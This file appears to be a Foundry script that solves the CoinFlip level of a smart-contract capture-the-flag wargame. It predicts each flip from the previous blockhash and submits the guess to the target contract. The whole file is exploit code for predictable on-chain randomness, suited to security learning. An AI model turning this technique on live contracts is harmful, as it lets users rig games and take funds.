// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;


import{CoinFlip} from "../src/Level3.sol";
import{Script,console} from "forge-std/Script.sol";

contract Level3Solution is Script{
    CoinFlip public level3=CoinFlip(0x8631c7EE56623e6E50c6fd00cBed772530eDba63);
    uint256 constant FACTOR=57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() public{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        //implement the same logic in coinflip contract
        uint256 blockValue=uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        level3.flip(side);
        console.log("Consecutive Wins: ", level3.consecutiveWins());
        vm.stopBroadcast();
    }

}